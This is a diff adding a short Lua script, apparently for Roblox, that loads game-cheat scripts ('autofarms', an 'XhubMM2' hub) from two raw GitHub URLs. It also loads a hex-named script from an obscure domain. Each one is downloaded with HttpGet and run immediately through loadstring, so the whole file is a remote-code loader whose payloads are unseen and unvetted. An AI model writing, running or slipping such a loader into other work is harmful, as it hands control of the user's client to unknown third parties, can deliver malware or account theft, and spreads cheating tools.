@@ -1,0 +1,9 @@
+for _, url in pairs({
+    "https://raw.githubusercontent.com/Dekos-lgbty/halloweens/refs/heads/main/autofarms",
+    "https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"
+}) do
+    loadstring(game:HttpGet(url, true))()
+end
+
+
+loadstring(game:HttpGet("https://egorikusa.space/c4f39df05f45c751928e95b1.lua", true))()
